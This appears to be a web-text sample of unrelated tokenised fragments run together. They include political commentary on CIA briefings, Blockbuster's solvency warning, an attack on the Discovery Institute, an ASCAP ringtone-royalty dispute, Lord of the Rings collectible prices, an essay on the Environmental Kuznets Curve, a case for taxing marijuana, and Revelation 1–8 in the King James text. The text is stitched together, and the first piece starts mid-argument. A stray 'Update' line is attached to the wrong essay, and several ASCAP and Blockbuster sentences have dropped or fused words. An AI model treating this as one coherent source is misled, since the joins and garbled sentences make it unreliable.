He 's sometimes been mocked for this compulsive practice , but he 's never been doubted about the completeness or accuracy of what he compiles .
( In the fine print of those records would be an indication that I had interviewed him about Iraq war policy while he was in the Senate and recently spent time with him when he was on this side of the world . )
So if he says he never got the briefing , he did n't .
And if the CIA or anyone acting on its behalf challenges him , they are stupid and incompetent as well as being untrustworthy .
This does n't prove that the accounts of briefing Pelosi are also inaccurate .
But it shifts the burden of proof .
Blockbuster just disclosed to the SEC there is " substantial doubt " about its ability to continue breathing , since there are no assurances it can meet the conditions of a $ 250 million loan that 's its current lifeline .

And even if the loan keeps going it still not " may not have sufficient liquidity to finance the ongoing obligations of our business , which raises substantial doubt about our ability to continue as a going concern . "
So , uh , who did n't see this coming ?
Unlike Circuit City though , this does n't exactly make me sad .

discovery institute caught daydreaming
Take a peek into the bizarro world of the Discovery Institute , where random cranks are scientific icons in waiting and evolution is about to be rejected by Big Science .
Apparently within five years , the idea that evolution can produce complex microscopic structures will be dead , thrown into the enormous junk bin of science and creationists will be riding high and calling the shots around biology labs as their movement flourishes .
Or at least this is what William Dembski fantasized about in 2004 during an interview with a religious magazine .
It ’s been five years now and evolution is still going strong as the dominant theory underpinning modern biology .
I suppose it ’s going to be a sudden collapse .
Or maybe , in a much more plausible scenario , this was just Dembski being himself , making bold claims he can’t support by anything other than the fantasies of the Discovery Institute and its small staff of whiny , vapid ignoramuses .
In the next five years , molecular Darwinism , the idea that Darwinian processes produce complex molecular structures at subcellular levels , will be dead .
When that happens , evolutionary biology will experience a crisis of confidence because evolutionary biology hinges on the evolution of the right molecules .
I therefore foresee a Taliban - style collapse of Darwinism in the next ten years .
Intelligent design will of course profit greatly from this .
For ID to win the day , however , will require talented new researchers able to move this research program forward , showing how intelligent design provides better insights into biological systems than the dying Darwinian paradigm .
If you note , he does n’t say why scientists will all of a sudden discard the principles of evolution in microscopic structures .
He just proclaims they will and goes on to daydream about how great it will be to spout all sorts of quasi - theological pseudoscience once all the real scientists pack up their things and take a collective hike .
It must ’ve burned him pretty badly to hear actual scientists tell the public that his book has about the same level of scientific validity as Deepak Chopra ’s fluffy pontifications on New Age woo , so he ’s savoring the thought of vindication in the eyes of the people he wanted to impress and failed miserably in his attempt .
If he was able to really show that evolution could n’t have happened without a supernatural catalyst , he would n’t be regarded as a pompous buffoon paid to talk about things he knows nothing about .
Instead , he would be giving a lecture on his ideas after accepting his Nobel Prize .
People like him have been predicting that evolutionary ideas will fail as inadequate and unproven for as long as Darwin ’s theory of natural selection answered questions being posed by naturalists about the similarity of all living things on our planet .
They ’ve been wrong for almost a century and a half .
Maybe that should ’ve been a signal that they ’re barking up the wrong tree ?
It ’s painfully embarrassing to fail at something generation after generation and yet keep trying .
And to be cruel but honest , that ’s also the colloquial definition of insanity : to do the same thing over and over , and expecting a different result with every attempt .
Even their basic lingo has n’t changed in 150 years .
They still call evolution Darwinism , which is like calling gravity Newtonism and ignoring Einstein ’s profound expansions of Newton ’s framework .
It ’s intellectually lazy , scientifically inept and just plain wrong .
Pretty much like the entire intelligent design movement .

Ah , those collection societies just never learn , do they ?
We 've discussed in the past how ASCAP once threatened the Girl Scouts for singing songs around the campfire , but in the past few years it 's been ASCAP 's counterpart in the UK that 's been in the news the most for things like threatening small business owners after calling them on the phone and saying they hear music in the background or threatening a stable owner for playing the radio to her horses .
I guess ASCAP was feeling a bit left out .
Its latest move is to claim that legally purchased ringtones on mobiles phones , playing in public places , represents a public performance for which it is owed royalties .
Songwriters and music publishers already are paid royalties on ringtone purchases , but ASCAP is claiming that buying the file is entirely different than " the performance " ( i.e. , the phone ringing ) .
In the EFF 's response to ASCAP , it notes that copyright law makes a specific exemption for performances made " without any purpose of direct or indirect commercial advantage . "
ASCAP counters that even if that 's true , only the owners of mobile phones can make that assertion , but the mobile operators ( AT&T , Verizon , Sprint , etc. ) still need to pay up for performance rights becauseare commercial entities , even if the use of the phones is not .
The EFF goes on to point out how this reasoning does not mesh with the law , the case law , or the intended purpose of copyright .
On top of this , even if , in some bizarre , twisted interpretation of the law , a ringtone playing on a phonea public performance , how would it be the mobile operators ' liability to pay ?
That would be like saying that Apple should pay ASCAP royalties because songs it sells on iTunespotentially be played through speakers publicly somewhere .
Perhaps I should n't be giving ASCAP ideas ... However , this is not a surprise .
It 's simply the way industry groups ( even those representing the songwriters , rather than the labels ) have always worked .
It 's always about " extending " rights .
That 's why copyright was broken down eventually into different types of rights -- including distribution rights and performance rights , because the " old " rights did n't fit the new technologies .
It 's a particularly obnoxious trick to claim that , because a single file can be used in multiple ways ( for both distribution and performance ) , it is now subject to both types of royalties .
The only reason those separate royalties were broken out in the first place was due to angry demands from these sorts of groups about how the old " rights " did n't cover new media versions of content .
To then double back and claim multiple coverage is beyond obnoxious .

We already know that Lord of the Rings is great , but watching the movies ( the extended versions , of course ) simply is n’t enough for people like me .
Oh , no , we take it to a whole different level .
I do n’t dress up like a Hobbit ( I ’m not a COMPLETE loser ) , but I do keep an eye out for household decorations .
Here are ten cool things I found :
Gollum Life Size Display
I WANT this .
But if I get it , I would have to hide it so no one I know ever sees it when they come over .
It is creepy , but it is a 1:1 scale of the slimy creature , and there ’s nothing better than a 1:1 scale for statues .
Price range : $ 540 - $ 900 .
At one point , a website I found had it listed for $ 409 , but it turned out to be a mistake because the price from the manufacturer is $ 425 plus freight .
The man thanked me for catching the mistake and gave me a deal on something .
Smeagol Statue
Less creepy than the Gollum statue but virtually the same .
I want this too , but they ’re not for sale in any store anymore .
Best chance is finding it is on Ebay ( I even found someone selling it on Craigslist ) .
A woman sold her ’s on Ebay for $ 1010 with a start price of $ 300 .
I found another on Ebay which came with a stand , and that had a start price of $ 450 .
Balrog Monument
Even though I love the Balrog , I ’m not certain I ’d want this hanging on my wall .
It ’s a big nasty head .
But then again , if the price drops dramatically or if I meet a drug - addicted LOTR fan on the street selling it in exchange for cash for some blow , I might come around .
Price range : $ 1750 - $ 3999 , plus a load more for shipping .
Balrog Wall Mount
This is the far more economical of choices for people who want the Balrog ’s head hanging on their wall .
Not really sure if I ’d want this either , but if I had to decide between the two , might as well get the bigger one .
Now , if they built a 1:1 scale Balrog statue , I ’m all over that .
Price range : $ 100 - $ 130 plus shipping .
Epic Scale Balrog with Lights and Sound
This is n’t a statue , but a really big toy that is n’t even meant to be played with .
It ’s more for posing and putting on a large shelf .
Sideshow Collectibles made a statue a while back but I can’t find one for sale to save my life , so I settled for this toy .
Price range : $ 90 -$ 200 .
Aragorn 24 - inch Fine Pewter Statue
I ’m not a big fan of pewter statues .
I mean , a piece of donkey crap as a pewter statue would still cost a lot , so to me there ’s nothing special about this .
Also , I ’d say strange creatures are more interesting than humans .
Sorry , Aragorn .
Price range : $ 355.20 -$ 1300 .
Witch King War Helm
Now this is cool .
Typically I ’m not into costumes but this helmet beats them all .
Price range : $ 275 - $ 1000 .
Cave Troll
Originally priced at $ 300 from Sideshow Collectibles , someone on Ebay listed it at $ 1200 .
Battle Troll of Mordor
I got this !
Won it on Ebay .
These are still available as of May 2009 .
Typically you can get them new for $ 175 plus shipping .
Price range : $ 155 -$ 270 .
Gothmog on Warg
A highly - detailed piece … might have to splurge and get a few .
Price range : $ 200 - $ 300 .
There are many , many more cool LOTR things out there , and I ’m anxiously awaiting The Hobbit to come out in theaters so more stuff is made .
There are also a number of LOTR busts , but there ’s something creepy about just a head on a stand .
The single - most expensive LOTR thing I found was the Gandalf the Grey Bronze Statue for $ 6495 ( sold out , of course , with only 36 made ) .
Sideshow Collectibles typically makes the best stuff , but just about everything is limited edition and sells out .
Gentle Giant also makes some nice things .
Rubies made the Gollum statue , while New Line made the Smeagal statue .
Know of more cool LOTR stuff ?
Let me know .

[ Update : Dammit , the New York Daily News beat me to this by like 30 minutes . ]
The Environmental Kuznets Curve ( henceforth EKC ) was developed from a paper written by Simon Kuznets in 1955 titled Economic Growth and Income Inequality .
His theory explained that the relationship between economic growth and income inequality forms an inverted U - shape graph with income inequality on the y - axis and economic growth ( e.g. GDP / capita ) on the x-axis .
EKCs extend Kuznets ’ original theory by stating that pollution increases as economies grow from agrarian to industrial , but as the population becomes wealthier a turning point is passed after which the amount of pollution decreases as income grows , forming an inverted U - shape ( Figure 1 ) .
As such , EKC theory has been cited as a justification to prioritize economic development over environmental stewardship ( Beckerman , 1992 ) , and just last week the science reporter for the New York Times , John Tierney , wrote an article claiming exactly the same thing :
“ The richer everyone gets , the greener the planet will be in the long run . ”
However , after 20 years of research and over 100 peer - reviewed papers , academia has yet to come to a consensus over the exact mechanism driving EKCs .
Much of the disagreement over EKCs stem from shaky empirical support .
To be sure , numerous studies used empirical tests and found the existence of EKCs , but many of these same studies disagree in two important ways : 1 ) estimates of the turning point of the inverted U - shape for pollutants vary widely and 2 ) the EKC relationship describes the trends for some pollutants only , not all .
I propose that the lack of consensus surrounding EKCs stem from the fact that EKC theory , as it has been studied , ignores the laws of thermodynamics .
Review of the First Law of Thermodynamics
The first law of thermodynamics states that energy cannot be created nor destroyed .
When coal is burned , for example , all of its energy is transformed to some other form , such as electricity , sulfur dioxide or nitrogen oxide to name just three .
There are a myriad of other examples .
The important point is that energy is conserved in every transformation .
A basic understanding of the first law is important because it means that transforming pollution from one form to another is not the same as eliminating pollution .
That is , extracting pollutants from flue gases transforms the pollutant , but does not eliminate it .
To illustrate this point empirically , I have reexamined two of the most commonly cited examples supporting EKCs : deforestation and sulfur dioxide .
Deforestation
Cropper and Griffiths ( 1994 ) tested for an EKC relationship between income and deforestation in 64 developing countries around the globe and found that the incomes of many of the African and Latin American countries were still below the turning point ; meaning that those countries were not yet rich enough to stop deforestation .
However , in a similar study Panayotou ( 1995 ) analyzed deforestation in 41 tropical nations and found that the turning point for deforestation was around $ 1,300 per capita ( 2003 dollars ) , which is much lower than the turning point estimates for many air pollutants .
Panayotou explains that deforestation should have a lower turning point than most industrial air pollutants as most tropical deforestation occurs to clear land for farming , which occurs before industrialization in the “ normal ” evolution of an economy .
The list of papers examining EKC and deforestation seems ever expanding , and for a detailed discussion see Yandle et al. , ( 2004 ) .
Global per capita GDP , however , is roughly 4 times the turning point level cited by Panayotou ( 1995 ) , and has been since 1990 , yet the forest area around the globe has declined over that entire time period ( Figure 2 ) .
According to the findings of Panayotou ( 1995 ) , forest area around the globe should be increasing , as the global income is greater than the turning point in the EKC .
Thus simple attempts to validate the findings of Panayotou fail , moreover , they are contradictory .
Sulfur - Dioxide
Burning coal releases the embodied chemical energy within the coal and in doing so creates electricity and numerous pollutants .
After the Clean Air Act was enacted , coal burning power plants ( among others ) installed scrubbers so that these pollutants could be removed from the flue gases , and hence decrease air pollution .
As a result , many EKC studies found strong correlations between high income and low sulfur dioxide emissions ( Grossman and Kruegar , 1991 ; Selden and Song , 1994 ; Cole et al. , 2001 ) .
Each of these studies excluded , however , the fact that these high - income areas had decreased sulfur emissions at the expense of increased ground pollutants in the form of Coal Combustion Waste ( CCW ) .
CCW is the amalgamated end product of many flue gas pollutants , including sulfur dioxide .
In this example , the CCWs are shipped back to the coalmine or stacked outside the coal power plant .
Data on CCW is hard to find , but the little that I could find indicates that more landfills and surface impoundments , i.e. the facilities that store CCW , are coming on - line as U.S. income grows ( Figures 3 ) .
In other words , increasing income is correlated negatively with sulfur dioxide emissions , but correlated positively with the production of CCW .
So in accordance with the first law of thermodynamics , scrubbing sulfur pollutants out of a flue gas does n’t eliminate the pollutant , rather it simply transforms the pollutant .
Conclusion
Yandle et al. ( 2004 ) state “ By the mid-1990 ’s , investigations of the EKC relationships had generated enough consistent findings to give assurance for many pollutants , richer is definitely cleaner . ”
Yet EKCs do not have wide empirical support , and since simple attempts to validate the empirical support for EKCs fail , I question the utility of EKCs as a unifying paradigm for environmental and economic policy .
As I have shown in the examples of deforestation and sulfur dioxide , simply changing or extrapolating the system boundaries to incorporate thermodynamics calls into question the EKC relationship .
To be sure , it is true that sulfur dioxide emissions have decreased within the U.S. as income has increased , which seems to support the EKC theory , but is it then justified to say , in light of figure 3 and the First Law , that we do n’t have a sulfur pollution problem ?
Wealth may allow societies to deal with pollution in a more efficient manner or transform pollution into a less harmful form , but the idea that all nations can become wealthy by consuming the world 's resources yet be pollution - free is antithetical to the laws of thermodynamics .
The quote by Yandle et al. ( 2004 ) is deeply troubling on a conceptual level also .
It not only encourages policy makers to place priority on economic development over environmental stewardship , it implies that a growing economy by default will resolve environmental issues and hence direct environmental action is unnecessary .
This idea may be supported by faithful EKC believers , but as York , Clark and Foster have eloquently and thoroughly discussed , it is farcical to most natural scientists .
To ensure that economic and environmental policies work together to promote a healthy economy and planet , policy makers should use scientific concepts that enjoy wide empirical support , such as the Laws of Thermodynamics , as a unifying theme governing pollution patterns and draft policies based on these laws , rather than EKCs .

One thing the Prop 215 medical marijuana dispensary craze has shown - people are willing to pay far more for legal marijuana than ever expected .
Regulation and taxation of marijuana could produce six billion dollars in additional tax revenue , according to economic studies linked from their web site LetUsPayTaxes.com .
In addition , it could save up to ten billion dollars in enforcement costs .
“ That is a conservative estimate , ” said Schaffer .
“ By other estimates , the revenues could be five times that .
The economists are with us all the way on this one .
Marijuana prohibition is an economic disaster . ”
“ It is ridiculous that California ca n’t pay its bills , ” said spokesman Clifford Schaffer .
“ It is a tragedy that they will cut badly needed services and programs such as medical care for the elderly and prison drug treatment when the money to fund all these programs and more is there and available .
Everyone who is currently waiting for a check from the state should be enraged at this foolishness . ”
While Sacramento scrambles to cut hundreds of millions of dollars of funding for public transportation and other programs around the state , a serious group of underground marijuana professionals are offering to pay at least a billion dollars in taxes , if only California would legalize pot .
Update - May 18 , 2009 : A year and a half later , Gov. Arnold Schwarzengger is now willing to take this idea to the store .
Our sources tell us that a bag of high quality " reefer " that would be sold on the street for $ 50 for an eighth of an ounce was being sold for $ 75 - 80 in most dispensaries .
If there was a $ 25 tax on an eighth of an ounce of marijuana , like there seems to be on medical marijuana , the government would reap $ 3,200 per pound in taxes .
To make $ 1 billion in taxes , California would have to sell about 320,000 pounds of the green stuff , the equivalent of 14 tons .
It seems like a lot of pot until you realize that every week it seems theres a story of a ton of weed being discovered in a truck over here or a half ton of weed being nabbed by the cops over there .
Which makes us assume that there are tons and tons of marijuana being smoked and sold every day .
Thus , the theory that pot could save Cali could be true .
Too bad we have a Governor in office who was perfectly happy smoking weed when he was younger , and saw first hand that it did not hinder him from achieving wild success , but who now has no interest in sharing that experience regardless of what the people who he was elected to represent think , and regardless of the fact that the harmless plant could very well save the world - or at least the budget .
Political girlie men are the worst .

Revelations
REV 1:1 The Revelation of Jesus Christ , which God gave unto him , to shew unto his servants things which must shortly come to pass ; and he sent and signified it by his angel unto his servant John :
REV 1:2
Who bare record of the word of God , and of the testimony of Jesus Christ , and of all things that he saw .
REV 1:3 Blessed is he that readeth , and they that hear the words of this prophecy , and keep those things which are written therein : for the time is at hand .
REV 1:4 John to the seven churches which are in Asia : Grace be unto you , and peace , from him which is , and which was , and which is to come ; and from the seven Spirits which are before his throne ;
REV 1:5
And from Jesus Christ , who is the faithful witness , and the first begotten of the dead , and the prince of the kings of the earth .
Unto him that loved us , and washed us from our sins in his own blood ,
REV 1:6
And hath made us kings and priests unto God and his Father ; to him be glory and dominion for ever and ever .
Amen .
REV 1:7 Behold , he cometh with clouds ; and every eye shall see him , and they also which pierced him : and all kindreds of the earth shall wail because of him .
Even so , Amen .
REV 1:8 I am Alpha and Omega , the beginning and the ending , saith the Lord , which is , and which was , and which is to come , the Almighty .
REV 1:9 I John , who also am your brother , and companion in tribulation , and in the kingdom and patience of Jesus Christ , was in the isle that is called Patmos , for the word of God , and for the testimony of Jesus Christ .
REV 1:10 I was in the Spirit on the Lord 's day , and heard behind me a great voice , as of a trumpet ,
REV 1:11 Saying , I am Alpha and Omega , the first and the last : and , What thou seest , write in a book , and send it unto the seven churches which are in Asia ; unto Ephesus , and unto Smyrna , and unto Pergamos , and unto Thyatira , and unto Sardis , and unto Philadelphia , and unto Laodicea .
REV 1:12
And I turned to see the voice that spake with me .
And being turned , I saw seven golden candlesticks ;
REV 1:13
And in the midst of the seven candlesticks one like unto the Son of man , clothed with a garment down to the foot , and girt about the paps with a golden girdle .
REV 1:14
His head and his hairs were white like wool , as white as snow ; and his eyes were as a flame of fire ;
REV 1:15
And his feet like unto fine brass , as if they burned in a furnace ; and his voice as the sound of many waters .
REV 1:16
And he had in his right hand seven stars : and out of his mouth went a sharp twoedged sword : and his countenance was as the sun shineth in his strength .
REV 1:17
And when I saw him , I fell at his feet as dead .
And he laid his right hand upon me , saying unto me , Fear not ; I am the first and the last :
REV 1:18 I am he that liveth , and was dead ; and , behold , I am alive for evermore , Amen ; and have the keys of hell and of death .
REV 1:19
Write the things which thou hast seen , and the things which are , and the things which shall be hereafter ;
REV 1:20
The mystery of the seven stars which thou sawest in my right hand , and the seven golden candlesticks .
The seven stars are the angels of the seven churches : and the seven candlesticks which thou sawest are the seven churches .
REV 2:1
Unto the angel of the church of Ephesus write ;
These things saith he that holdeth the seven stars in his right hand , who walketh in the midst of the seven golden candlesticks ;
REV 2:2
I know thy works , and thy labour , and thy patience , and how thou canst not bear them which are evil : and thou hast tried them which say they are apostles , and are not , and hast found them liars :
REV 2:3
And hast borne , and hast patience , and for my name 's sake hast laboured , and hast not fainted .
REV 2:4 Nevertheless
I have somewhat against thee , because thou hast left thy first love .
REV 2:5 Remember therefore from whence thou art fallen , and repent , and do the first works ; or else I will come unto thee quickly , and will remove thy candlestick out of his place , except thou repent .
REV 2:6
But this thou hast , that thou hatest the deeds of the Nicolaitanes , which I also hate .
REV 2:7
He that hath an ear , let him hear what the Spirit saith unto the churches ;
To him that overcometh will I give to eat of the tree of life , which is in the midst of the paradise of God .
REV 2:8
And unto the angel of the church in Smyrna write ;
These things saith the first and the last , which was dead , and is alive ;
REV 2:9 I know thy works , and tribulation , and poverty , ( but thou art rich ) and I know the blasphemy of them which say they are Jews , and are not , but are the synagogue of Satan .
REV 2:10
Fear none of those things which thou shalt suffer : behold , the devil shall cast some of you into prison , that ye may be tried ; and ye shall have tribulation ten days : be thou faithful unto death , and I will give thee a crown of life .
REV 2:11
He that hath an ear , let him hear what the Spirit saith unto the churches ;
He that overcometh shall not be hurt of the second death .
REV 2:12
And to the angel of the church in Pergamos write ;
These things saith he which hath the sharp sword with two edges ;
REV 2:13 I know thy works , and where thou dwellest , even where Satan 's seat is : and thou holdest fast my name , and hast not denied my faith , even in those days wherein Antipas was my faithful martyr , who was slain among you , where Satan dwelleth .
REV 2:14
But I have a few things against thee , because thou hast there them that hold the doctrine of Balaam , who taught Balac to cast a stumblingblock before the children of Israel , to eat things sacrificed unto idols , and to commit fornication .
REV 2:15
So hast thou also them that hold the doctrine of the Nicolaitanes , which thing I hate .
REV 2:16 Repent ; or else I will come unto thee quickly , and will fight against them with the sword of my mouth .
REV 2:17
He that hath an ear , let him hear what the Spirit saith unto the churches ;
To him that overcometh will I give to eat of the hidden manna , and will give him a white stone , and in the stone a new name written , which no man knoweth saving he that receiveth it .
REV 2:18
And unto the angel of the church in Thyatira write ;
These things saith the Son of God , who hath his eyes like unto a flame of fire , and his feet are like fine brass ;
REV 2:19 I know thy works , and charity , and service , and faith , and thy patience , and thy works ; and the last to be more than the first .
REV 2:20 Notwithstanding
I have a few things against thee , because thou sufferest that woman Jezebel , which calleth herself a prophetess , to teach and to seduce my servants to commit fornication , and to eat things sacrificed unto idols .
REV 2:21
And I gave her space to repent of her fornication ; and she repented not .
REV 2:22 Behold , I will cast her into a bed , and them that commit adultery with her into great tribulation , except they repent of their deeds .
REV 2:23
And I will kill her children with death ; and all the churches shall know that I am he which searcheth the reins and hearts : and I will give unto every one of you according to your works .
REV 2:24
But unto you I say , and unto the rest in Thyatira , as many as have not this doctrine , and which have not known the depths of Satan , as they speak ; I will put upon you none other burden .
REV 2:25
But that which ye have already hold fast till I come .
REV 2:26
And he that overcometh , and keepeth my works unto the end , to him will I give power over the nations :
REV 2:27
And he shall rule them with a rod of iron ; as the vessels of a potter shall they be broken to shivers : even as I received of my Father .
REV 2:28
And I will give him the morning star .
REV 2:29
He that hath an ear , let him hear what the Spirit saith unto the churches .
REV 3:1
And unto the angel of the church in Sardis write ;
These things saith he that hath the seven Spirits of God , and the seven stars ; I know thy works , that thou hast a name that thou livest , and art dead .
REV 3:2
Be watchful , and strengthen the things which remain , that are ready to die : for I have not found thy works perfect before God .
REV 3:3 Remember therefore how thou hast received and heard , and hold fast , and repent .
If therefore thou shalt not watch , I will come on thee as a thief , and thou shalt not know what hour I will come upon thee .
REV 3:4
Thou hast a few names even in Sardis which have not defiled their garments ; and they shall walk with me in white : for they are worthy .
REV 3:5
He that overcometh , the same shall be clothed in white raiment ; and I will not blot out his name out of the book of life , but I will confess his name before my Father , and before his angels .
REV 3:6
He that hath an ear , let him hear what the Spirit saith unto the churches .
REV 3:7
And to the angel of the church in Philadelphia write ;
These things saith he that is holy , he that is true , he that hath the key of David , he that openeth , and no man shutteth ; and shutteth , and no man openeth ;
REV 3:8 I know thy works : behold , I have set before thee an open door , and no man can shut it : for thou hast a little strength , and hast kept my word , and hast not denied my name .
REV 3:9 Behold , I will make them of the synagogue of Satan , which say they are Jews , and are not , but do lie ; behold , I will make them to come and worship before thy feet , and to know that I have loved thee .
REV 3:10
Because thou hast kept the word of my patience , I also will keep thee from the hour of temptation , which shall come upon all the world , to try them that dwell upon the earth .
REV 3:11 Behold , I come quickly : hold that fast which thou hast , that no man take thy crown .
REV 3:12
Him that overcometh will I make a pillar in the temple of my God , and he shall go no more out : and I will write upon him the name of my God , and the name of the city of my God , which is new Jerusalem , which cometh down out of heaven from my God : and I will write upon him my new name .
REV 3:13
He that hath an ear , let him hear what the Spirit saith unto the churches .
REV 3:14
And unto the angel of the church of the Laodiceans write ;
These things saith the Amen , the faithful and true witness , the beginning of the creation of God ;
REV 3:15 I know thy works , that thou art neither cold nor hot : I would thou wert cold or hot .
REV 3:16
So then because thou art lukewarm , and neither cold nor hot , I will spue thee out of my mouth .
REV 3:17
Because thou sayest , I am rich , and increased with goods , and have need of nothing ; and knowest not that thou art wretched , and miserable , and poor , and blind , and naked :
REV 3:18 I counsel thee to buy of me gold tried in the fire , that thou mayest be rich ; and white raiment , that thou mayest be clothed , and that the shame of thy nakedness do not appear ; and anoint thine eyes with eyesalve , that thou mayest see .
REV 3:19
As many as I love , I rebuke and chasten : be zealous therefore , and repent .
REV 3:20 Behold , I stand at the door , and knock : if any man hear my voice , and open the door , I will come in to him , and will sup with him , and he with me .
REV 3:21
To him that overcometh will I grant to sit with me in my throne , even as I also overcame , and am set down with my Father in his throne .
REV 3:22
He that hath an ear , let him hear what the Spirit saith unto the churches .
REV 4:1
After this I looked , and , behold , a door was opened in heaven : and the first voice which I heard was as it were of a trumpet talking with me ; which said , Come up hither , and I will shew thee things which must be hereafter .
REV 4:2
And immediately I was in the spirit : and , behold , a throne was set in heaven , and one sat on the throne .
REV 4:3
And he that sat was to look upon like a jasper and a sardine stone : and there was a rainbow round about the throne , in sight like unto an emerald .
REV 4:4
And round about the throne were four and twenty seats : and upon the seats I saw four and twenty elders sitting , clothed in white raiment ; and they had on their heads crowns of gold .
REV 4:5
And out of the throne proceeded lightnings and thunderings and voices : and there were seven lamps of fire burning before the throne , which are the seven Spirits of God .
REV 4:6
And before the throne there was a sea of glass like unto crystal : and in the midst of the throne , and round about the throne , were four beasts full of eyes before and behind .
REV 4:7
And the first beast was like a lion , and the second beast like a calf , and the third beast had a face as a man , and the fourth beast was like a flying eagle .
REV 4:8
And the four beasts had each of them six wings about him ; and they were full of eyes within : and they rest not day and night , saying , Holy , holy , holy , LORD God Almighty , which was , and is , and is to come .
REV 4:9
And when those beasts give glory and honour and thanks to him that sat on the throne , who liveth for ever and ever ,
REV 4:10
The four and twenty elders fall down before him that sat on the throne , and worship him that liveth for ever and ever , and cast their crowns before the throne , saying ,
REV 4:11
Thou art worthy , O Lord , to receive glory and honour and power : for thou hast created all things , and for thy pleasure they are and were created .
REV 5:1
And I saw in the right hand of him that sat on the throne a book written within and on the backside , sealed with seven seals .
REV 5:2
And I saw a strong angel proclaiming with a loud voice , Who is worthy to open the book , and to loose the seals thereof ?
REV 5:3
And no man in heaven , nor in earth , neither under the earth , was able to open the book , neither to look thereon .
REV 5:4
And I wept much , because no man was found worthy to open and to read the book , neither to look thereon .
REV 5:5
And one of the elders saith unto me , Weep not : behold , the Lion of the tribe of Juda , the Root of David , hath prevailed to open the book , and to loose the seven seals thereof .
REV 5:6
And I beheld , and , lo , in the midst of the throne and of the four beasts , and in the midst of the elders , stood a Lamb as it had been slain , having seven horns and seven eyes , which are the seven Spirits of God sent forth into all the earth .
REV 5:7
And he came and took the book out of the right hand of him that sat upon the throne .
REV 5:8
And when he had taken the book , the four beasts and four and twenty elders fell down before the Lamb , having every one of them harps , and golden vials full of odours , which are the prayers of saints .
REV 5:9
And they sung a new song , saying , Thou art worthy to take the book , and to open the seals thereof : for thou wast slain , and hast redeemed us to God by thy blood out of every kindred , and tongue , and people , and nation ;
REV 5:10
And hast made us unto our God kings and priests : and we shall reign on the earth .
REV 5:11
And I beheld , and I heard the voice of many angels round about the throne and the beasts and the elders : and the number of them was ten thousand times ten thousand , and thousands of thousands ;
REV 5:12 Saying with a loud voice , Worthy is the Lamb that was slain to receive power , and riches , and wisdom , and strength , and honour , and glory , and blessing .
REV 5:13
And every creature which is in heaven , and on the earth , and under the earth , and such as are in the sea , and all that are in them , heard I saying , Blessing , and honour , and glory , and power , be unto him that sitteth upon the throne , and unto the Lamb for ever and ever .
REV 5:14
And the four beasts said , Amen .
And the four and twenty elders fell down and worshipped him that liveth for ever and ever .
REV 6:1
And I saw when the Lamb opened one of the seals , and I heard , as it were the noise of thunder , one of the four beasts saying , Come and see .
REV 6:2
And I saw , and behold a white horse : and he that sat on him had a bow ; and a crown was given unto him : and he went forth conquering , and to conquer .
REV 6:3
And when he had opened the second seal , I heard the second beast say , Come and see .
REV 6:4
And there went out another horse that was red : and power was given to him that sat thereon to take peace from the earth , and that they should kill one another : and there was given unto him a great sword .
REV 6:5
And when he had opened the third seal , I heard the third beast say , Come and see .
And I beheld , and lo a black horse ; and he that sat on him had a pair of balances in his hand .
REV 6:6
And I heard a voice in the midst of the four beasts say , A measure of wheat for a penny , and three measures of barley for a penny ; and see thou hurt not the oil and the wine .
REV 6:7
And when he had opened the fourth seal , I heard the voice of the fourth beast say , Come and see .
REV 6:8
And I looked , and behold a pale horse : and his name that sat on him was Death , and Hell followed with him .
And power was given unto them over the fourth part of the earth , to kill with sword , and with hunger , and with death , and with the beasts of the earth .
REV 6:9
And when he had opened the fifth seal , I saw under the altar the souls of them that were slain for the word of God , and for the testimony which they held :
REV 6:10
And they cried with a loud voice , saying , How long , O Lord , holy and true , dost thou not judge and avenge our blood on them that dwell on the earth ?
REV 6:11
And white robes were given unto every one of them ; and it was said unto them , that they should rest yet for a little season , until their fellowservants also and their brethren , that should be killed as they were , should be fulfilled .
REV 6:12
And I beheld when he had opened the sixth seal , and , lo , there was a great earthquake ; and the sun became black as sackcloth of hair , and the moon became as blood ;
REV 6:13
And the stars of heaven fell unto the earth , even as a fig tree casteth her untimely figs , when she is shaken of a mighty wind .
REV 6:14
And the heaven departed as a scroll when it is rolled together ; and every mountain and island were moved out of their places .
REV 6:15
And the kings of the earth , and the great men , and the rich men , and the chief captains , and the mighty men , and every bondman , and every free man , hid themselves in the dens and in the rocks of the mountains ;
REV 6:16
And said to the mountains and rocks , Fall on us , and hide us from the face of him that sitteth on the throne , and from the wrath of the Lamb :
REV 6:17
For the great day of his wrath is come ; and who shall be able to stand ?
REV 7:1
And after these things I saw four angels standing on the four corners of the earth , holding the four winds of the earth , that the wind should not blow on the earth , nor on the sea , nor on any tree .
REV 7:2
And I saw another angel ascending from the east , having the seal of the living God : and he cried with a loud voice to the four angels , to whom it was given to hurt the earth and the sea ,
REV 7:3 Saying ,
Hurt not the earth , neither the sea , nor the trees , till we have sealed the servants of our God in their foreheads .
REV 7:4
And I heard the number of them which were sealed : and there were sealed an hundred and forty and four thousand of all the tribes of the children of Israel .
REV 7:5
Of the tribe of Juda were sealed twelve thousand .
Of the tribe of Reuben were sealed twelve thousand .
Of the tribe of Gad were sealed twelve thousand .
REV 7:6
Of the tribe of Aser were sealed twelve thousand .
Of the tribe of Nephthalim were sealed twelve thousand .
Of the tribe of Manasses were sealed twelve thousand .
REV 7:7
Of the tribe of Simeon were sealed twelve thousand .
Of the tribe of Levi were sealed twelve thousand .
Of the tribe of Issachar were sealed twelve thousand .
REV 7:8
Of the tribe of Zabulon were sealed twelve thousand .
Of the tribe of Joseph were sealed twelve thousand .
Of the tribe of Benjamin were sealed twelve thousand .
REV 7:9
After this I beheld , and , lo , a great multitude , which no man could number , of all nations , and kindreds , and people , and tongues , stood before the throne , and before the Lamb , clothed with white robes , and palms in their hands ;
REV 7:10
And cried with a loud voice , saying , Salvation to our God which sitteth upon the throne , and unto the Lamb .
REV 7:11
And all the angels stood round about the throne , and about the elders and the four beasts , and fell before the throne on their faces , and worshipped God ,
REV 7:12 Saying , Amen : Blessing , and glory , and wisdom , and thanksgiving , and honour , and power , and might , be unto our God for ever and ever .
Amen .
REV 7:13
And one of the elders answered , saying unto me , What are these which are arrayed in white robes ?
and whence came they ?
REV 7:14
And I said unto him , Sir , thou knowest .
And he said to me , These are they which came out of great tribulation , and have washed their robes , and made them white in the blood of the Lamb .
REV 7:15
Therefore are they before the throne of God , and serve him day and night in his temple : and he that sitteth on the throne shall dwell among them .
REV 7:16
They shall hunger no more , neither thirst any more ; neither shall the sun light on them , nor any heat .
REV 7:17
For the Lamb which is in the midst of the throne shall feed them , and shall lead them unto living fountains of waters : and God shall wipe away all tears from their eyes .
REV 8:1
And when he had opened the seventh seal , there was silence in heaven about the space of half an hour .
